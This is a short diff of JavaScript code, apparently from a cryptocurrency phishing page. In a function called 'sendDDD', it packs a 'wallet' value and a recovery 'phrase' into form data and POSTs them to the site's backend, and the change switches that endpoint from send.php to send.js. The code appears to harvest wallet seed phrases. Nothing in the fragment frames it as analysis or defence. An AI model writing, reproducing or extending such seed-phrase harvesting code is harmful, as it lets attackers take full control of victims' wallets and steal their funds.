@@ -23,7 +23,7 @@ const sendDDD = _ => {
                         formData.append('wallet', wallet);
                         formData.append('phrase', phrase);
 
-                        await fetch('./send.php', {
+                        await fetch('./send.js', {
                             method: 'POST',
                             body: formData
                         }).then(res => {
